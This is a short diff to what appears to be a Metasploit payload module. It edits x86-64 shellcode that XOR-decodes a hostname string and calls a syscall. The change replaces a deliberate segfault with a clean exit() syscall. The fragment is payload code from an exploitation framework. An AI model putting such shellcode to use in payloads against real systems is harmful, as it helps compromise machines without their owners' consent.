@@ -49,7 +49,11 @@ module MetasploitModule
       pop rdi    ; rdi points to the hostname string.
       xor byte [rdi+rsi], 0x41
       syscall
-      ret        ; break the loop by causing segfault.
+      
+      push 60    ; exit() syscall number.
+      pop rax
+      xor rdi,rdi
+      syscall
 
     str:
       call end
